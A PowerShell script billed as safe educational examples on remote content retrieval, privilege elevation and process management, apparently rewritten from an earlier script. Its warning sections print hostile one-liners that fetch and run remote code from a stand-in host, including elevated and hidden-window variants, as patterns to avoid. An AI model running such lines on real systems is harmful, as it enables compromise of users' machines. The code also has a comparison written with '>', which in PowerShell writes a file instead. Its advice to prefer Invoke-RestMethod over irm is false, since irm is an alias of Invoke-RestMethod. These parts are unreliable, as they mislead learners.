# PowerShell Educational Examples
# Safe demonstration of advanced PowerShell techniques
# Version: 1.0.0
# Author: Educational Project
# Description: Educational examples of PowerShell techniques for learning purposes

<#
.SYNOPSIS
    PowerShell Educational Examples for Safe Learning

.DESCRIPTION
    This script demonstrates various PowerShell techniques in a safe, educational manner.
    It shows concepts like remote execution, elevated privileges, and process management
    without the risks associated with malicious code.

.PARAMETER Example
    The educational example to demonstrate:
    - RemoteExecution: Safe remote content retrieval
    - ElevatedExecution: Privilege checking and management
    - ProcessManagement: Safe process creation and management
    - All: Run all examples

.EXAMPLE
    .\powershell-educational-examples.ps1 -Example RemoteExecution
    Demonstrates safe remote content retrieval techniques.

.EXAMPLE
    .\powershell-educational-examples.ps1 -Example All
    Runs all educational examples.

.NOTES
    - This script is for educational purposes only
    - All examples use safe, known sources
    - Demonstrates legitimate PowerShell techniques
    - Includes comprehensive safety warnings

.LINK
    https://docs.microsoft.com/en-us/powershell/
#>

param(
    [Parameter(Mandatory=$true)]
    [ValidateSet("RemoteExecution", "ElevatedExecution", "ProcessManagement", "All")]
    [string]$Example
)

# Function to display safety warnings
function Show-SafetyWarnings {
    Write-Host "`n" -NoNewline
    Write-Host "=" * 60 -ForegroundColor Red
    Write-Host "  EDUCATIONAL PURPOSE ONLY - SAFETY WARNINGS" -ForegroundColor Red
    Write-Host "=" * 60 -ForegroundColor Red
    Write-Host "⚠️  These examples are for educational purposes only" -ForegroundColor Yellow
    Write-Host "⚠️  Never execute code from untrusted sources" -ForegroundColor Yellow
    Write-Host "⚠️  Always verify script sources before execution" -ForegroundColor Yellow
    Write-Host "⚠️  Use these techniques only in authorized environments" -ForegroundColor Yellow
    Write-Host "⚠️  Follow your organization's security policies" -ForegroundColor Yellow
    Write-Host "=" * 60 -ForegroundColor Red
    Write-Host "`n"
}

# Function to demonstrate safe remote execution
function Show-RemoteExecutionExample {
    Write-Host "`n🔗 REMOTE EXECUTION EDUCATIONAL EXAMPLE" -ForegroundColor Cyan
    Write-Host "=" * 50 -ForegroundColor Cyan
    
    Write-Host "`n📚 Educational Concept:" -ForegroundColor Yellow
    Write-Host "This demonstrates how PowerShell can retrieve content from remote sources."
    Write-Host "In the original script, this was used for: irm [url] | iex"
    Write-Host "We'll show the SAFE way to do this."
    
    Write-Host "`n⚠️  DANGEROUS PATTERN (DO NOT USE):" -ForegroundColor Red
    Write-Host "irm https://unknown-source.com/script.ps1 | iex" -ForegroundColor Red
    Write-Host "This downloads and immediately executes unknown code!"
    
    Write-Host "`n✅ SAFE PATTERN (Educational Example):" -ForegroundColor Green
    Write-Host "Using known, trusted sources with proper error handling"
    
    # Safe example using a known, trusted source
    $safeUrl = "https://raw.githubusercontent.com/microsoft/vscode/main/package.json"
    
    try {
        Write-Host "`n🔍 Attempting to retrieve content from safe source..." -ForegroundColor Cyan
        Write-Host "URL: $safeUrl" -ForegroundColor Gray
        
        # Safe remote content retrieval
        $content = Invoke-RestMethod -Uri $safeUrl -ErrorAction Stop
        Write-Host "✅ Successfully retrieved content from trusted source" -ForegroundColor Green
        Write-Host "Content type: $($content.GetType().Name)" -ForegroundColor Cyan
        Write-Host "Content length: $($content.ToString().Length) characters" -ForegroundColor Cyan
        
        # Show first few lines of content (safely)
        $contentString = $content.ToString()
        $preview = $contentString.Substring(0, [Math]::Min(200, $contentString.Length))
        Write-Host "`n📄 Content preview:" -ForegroundColor Yellow
        Write-Host $preview -ForegroundColor Gray
        if ($contentString.Length > 200) {
            Write-Host "... (truncated for safety)" -ForegroundColor Gray
        }
        
    } catch {
        Write-Host "❌ Error retrieving content: $($_.Exception.Message)" -ForegroundColor Red
        Write-Host "This demonstrates proper error handling" -ForegroundColor Yellow
    }
    
    Write-Host "`n📚 Key Learning Points:" -ForegroundColor Yellow
    Write-Host "• Always use trusted sources"
    Write-Host "• Implement proper error handling"
    Write-Host "• Never execute downloaded content without verification"
    Write-Host "• Use Invoke-RestMethod instead of irm for better control"
}

# Function to demonstrate elevated execution concepts
function Show-ElevatedExecutionExample {
    Write-Host "`n🔐 ELEVATED EXECUTION EDUCATIONAL EXAMPLE" -ForegroundColor Cyan
    Write-Host "=" * 50 -ForegroundColor Cyan
    
    Write-Host "`n📚 Educational Concept:"
    Write-Host "This demonstrates how to check for and handle elevated privileges."
    Write-Host "The original script used: Start-Process powershell -Verb RunAs"
    Write-Host "We'll show the SAFE way to handle privileges."
    
    Write-Host "`n⚠️  DANGEROUS PATTERN (DO NOT USE):" -ForegroundColor Red
    Write-Host "Start-Process powershell -Verb RunAs -ArgumentList 'irm [url] | iex'" -ForegroundColor Red
    Write-Host "This elevates privileges and executes unknown code!"
    
    Write-Host "`n✅ SAFE PATTERN (Educational Example):" -ForegroundColor Green
    Write-Host "Checking privileges and handling elevation safely"
    
    # Safe privilege checking
    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
    $isAdmin = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    
    Write-Host "`n🔍 Current Privilege Status:" -ForegroundColor Cyan
    Write-Host "Current User: $($currentUser.Name)" -ForegroundColor White
    Write-Host "Is Administrator: $isAdmin" -ForegroundColor $(if($isAdmin) {"Green"} else {"Yellow"})
    
    if ($isAdmin) {
        Write-Host "✅ Running with administrator privileges" -ForegroundColor Green
        Write-Host "This allows access to system-level operations" -ForegroundColor Cyan
    } else {
        Write-Host "⚠️  Running with standard user privileges" -ForegroundColor Yellow
        Write-Host "Some operations may require elevation" -ForegroundColor Cyan
    }
    
    # Demonstrate safe elevation request (educational)
    Write-Host "`n📚 Safe Elevation Pattern:" -ForegroundColor Yellow
    Write-Host "If elevation is needed, use this pattern:"
    Write-Host "Start-Process powershell -Verb RunAs -ArgumentList '-File script.ps1'"
    Write-Host "Note: Always use -File with known, trusted scripts"
    
    Write-Host "`n📚 Key Learning Points:" -ForegroundColor Yellow
    Write-Host "• Always check current privileges first"
    Write-Host "• Only elevate when necessary"
    Write-Host "• Use -File parameter with known scripts"
    Write-Host "• Never elevate to run unknown code"
}

# Function to demonstrate process management
function Show-ProcessManagementExample {
    Write-Host "`n⚙️  PROCESS MANAGEMENT EDUCATIONAL EXAMPLE" -ForegroundColor Cyan
    Write-Host "=" * 50 -ForegroundColor Cyan
    
    Write-Host "`n📚 Educational Concept:"
    Write-Host "This demonstrates how to manage processes safely."
    Write-Host "The original script used hidden execution with specific arguments."
    Write-Host "We'll show the SAFE way to manage processes."
    
    Write-Host "`n⚠️  DANGEROUS PATTERN (DO NOT USE):" -ForegroundColor Red
    Write-Host "Start-Process powershell -ArgumentList '-WindowStyle Hidden -NoProfile -Command irm [url] | iex'" -ForegroundColor Red
    Write-Host "This creates hidden processes that execute unknown code!"
    
    Write-Host "`n✅ SAFE PATTERN (Educational Example):" -ForegroundColor Green
    Write-Host "Safe process creation and management"
    
    # Safe process management examples
    Write-Host "`n🔍 Current PowerShell Processes:" -ForegroundColor Cyan
    $powershellProcesses = Get-Process -Name "powershell" -ErrorAction SilentlyContinue
    if ($powershellProcesses) {
        $powershellProcesses | ForEach-Object {
            Write-Host "PID: $($_.Id) | CPU: $($_.CPU) | Memory: $([math]::Round($_.WorkingSet/1MB, 2)) MB" -ForegroundColor White
        }
    } else {
        Write-Host "No PowerShell processes found" -ForegroundColor Yellow
    }
    
    # Demonstrate safe process creation
    Write-Host "`n📚 Safe Process Creation Examples:" -ForegroundColor Yellow
    Write-Host "1. Create process with visible window (safe):"
    Write-Host "   Start-Process notepad -PassThru"
    Write-Host "2. Create process with specific arguments (safe):"
    Write-Host "   Start-Process powershell -ArgumentList '-NoProfile -Command Get-Date'"
    Write-Host "3. Create process with error handling (safe):"
    Write-Host "   try { Start-Process 'known-safe-app' -ErrorAction Stop } catch { Write-Error 'Failed to start process' }"
    
    # Show current process information
    Write-Host "`n🔍 Current Process Information:" -ForegroundColor Cyan
    $currentProcess = Get-Process -Id $PID
    Write-Host "Process ID: $($currentProcess.Id)" -ForegroundColor White
    Write-Host "Process Name: $($currentProcess.ProcessName)" -ForegroundColor White
    Write-Host "Start Time: $($currentProcess.StartTime)" -ForegroundColor White
    Write-Host "Memory Usage: $([math]::Round($currentProcess.WorkingSet/1MB, 2)) MB" -ForegroundColor White
    
    Write-Host "`n📚 Key Learning Points:" -ForegroundColor Yellow
    Write-Host "• Always use known, trusted applications"
    Write-Host "• Implement proper error handling"
    Write-Host "• Avoid hidden execution unless necessary"
    Write-Host "• Monitor process resource usage"
}

# Function to demonstrate security best practices
function Show-SecurityBestPractices {
    Write-Host "`n🛡️  SECURITY BEST PRACTICES" -ForegroundColor Cyan
    Write-Host "=" * 50 -ForegroundColor Cyan
    
    Write-Host "`n📚 Security Guidelines:" -ForegroundColor Yellow
    Write-Host "1. Never execute code from untrusted sources"
    Write-Host "2. Always verify script sources before execution"
    Write-Host "3. Use -File parameter with known scripts"
    Write-Host "4. Implement proper error handling"
    Write-Host "5. Follow the principle of least privilege"
    Write-Host "6. Use signed scripts when possible"
    Write-Host "7. Regularly update PowerShell and modules"
    Write-Host "8. Monitor system resources and processes"
    
    Write-Host "`n⚠️  Red Flags to Avoid:" -ForegroundColor Red
    Write-Host "• Hidden execution (-WindowStyle Hidden)"
    Write-Host "• Remote code execution (irm [url] | iex)"
    Write-Host "• Elevated execution of unknown code"
    Write-Host "• Bypassing execution policies"
    Write-Host "• Disabling security features"
    
    Write-Host "`n✅ Safe Alternatives:" -ForegroundColor Green
    Write-Host "• Use Invoke-RestMethod for remote content"
    Write-Host "• Implement proper privilege checking"
    Write-Host "• Use -File parameter with known scripts"
    Write-Host "• Follow security best practices"
    Write-Host "• Use trusted sources only"
}

# Main script execution
Write-Host "PowerShell Educational Examples" -ForegroundColor Magenta
Write-Host "Safe demonstration of advanced PowerShell techniques" -ForegroundColor Gray
Write-Host "Version 1.0.0 - Educational Use Only" -ForegroundColor Gray
Write-Host "=" * 60 -ForegroundColor Magenta

# Show safety warnings
Show-SafetyWarnings

# Execute the requested example
switch ($Example) {
    "RemoteExecution" {
        Show-RemoteExecutionExample
    }
    "ElevatedExecution" {
        Show-ElevatedExecutionExample
    }
    "ProcessManagement" {
        Show-ProcessManagementExample
    }
    "All" {
        Show-RemoteExecutionExample
        Show-ElevatedExecutionExample
        Show-ProcessManagementExample
    }
}

# Always show security best practices
Show-SecurityBestPractices

Write-Host "`n🎓 Educational Examples Completed" -ForegroundColor Green
Write-Host "Remember: Use these techniques responsibly and safely!" -ForegroundColor Yellow
